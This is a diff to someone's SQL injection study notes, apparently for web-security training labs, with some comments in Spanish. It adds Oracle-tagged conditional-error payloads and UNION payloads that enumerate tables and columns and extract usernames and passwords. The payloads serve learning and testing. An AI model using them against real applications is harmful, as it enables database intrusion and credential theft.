@@ -2799,9 +2799,9 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 * Conditional errors
 (PoC)				TrackingId=xyz' 	==> error message vs TrackingId=xyz'' 		==> no error message
 				/filter?category=Pets' 	==> error message vs /filter?category=Pets''	==> no error message
-(users table exists?)		TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' ==> no error, table exists
-(Verify admin user)		TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-(guess password length)		TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+(users table exists? - Oracle)	TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' ==> no error, table exists
+(Verify admin user - Oracle)	TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+(guess pw length - Oracle)	TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 
 * Visible error-based
 (PoC)				TrackingId=ogAZZfxtOKUELbuJ' ==> verbose error message with full SQL query
@@ -2820,7 +2820,12 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 - parámetro de búsqueda. Ej: `category` - resultados de la query devueltos en la respuesta, por eso se puede usar UNION attack.
 
 ```
-(Non-Oracle) 			'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+(PoC)				/filter?category=Pets' 	==> error message vs /filter?category=Pets''   	==> no error message
+
+(List db - Non-Oracle)		'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--	==> 2 cols returned
+(List field names - Non-Oracle) '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+(List info - Non-Oracle)	'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
 (Oracle) 			'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 (Multiple values - 2 columns)	'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
